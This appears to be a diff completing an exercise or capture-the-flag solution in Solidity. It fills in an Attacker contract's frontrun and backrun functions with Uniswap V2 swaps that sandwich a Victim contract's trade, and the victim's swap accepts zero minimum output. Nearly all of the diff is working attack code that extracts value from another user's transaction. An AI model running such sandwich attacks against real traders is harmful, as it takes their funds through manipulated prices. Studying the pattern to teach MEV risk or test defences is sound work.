@@ -17,11 +17,37 @@ contract Attacker {
     // This function will be called before the victim's transaction.
     function frontrun(address router, address weth, address usdc) public {
         // your code here
+        uint256 balance = IERC20(weth).balanceOf(address(this));
+        IERC20(weth).approve(router, balance);
+        address[] memory path = new address[](2);
+        path[0] = weth;
+        path[1] = usdc;
+
+        IUniswapV2Router(router).swapExactTokensForTokens(
+            balance,
+            0,
+            path,
+            address(this),
+            block.timestamp + 1 minutes
+        );
     }
 
     // This function will be called after the victim's transaction.
     function backrun(address router, address weth, address usdc) public {
         // your code here
+        uint256 balance = IERC20(usdc).balanceOf(address(this));
+        IERC20(usdc).approve(router, balance);
+        address[] memory path = new address[](2);
+        path[0] = usdc;
+        path[1] = weth;
+
+        IUniswapV2Router(router).swapExactTokensForTokens(
+            balance,
+            0,
+            path,
+            address(this),
+            block.timestamp + 1 minutes
+        );
     }
 }
 
@@ -34,7 +60,11 @@ contract Victim {
 
     function performSwap(address[] calldata path) public {
         IUniswapV2Router(router).swapExactTokensForTokens(
-            1000 * 1e18, 0, path, address(this), block.timestamp + 1 minutes
+            1000 * 1e18,
+            0,
+            path,
+            address(this),
+            block.timestamp + 1 minutes
         );
     }
 }
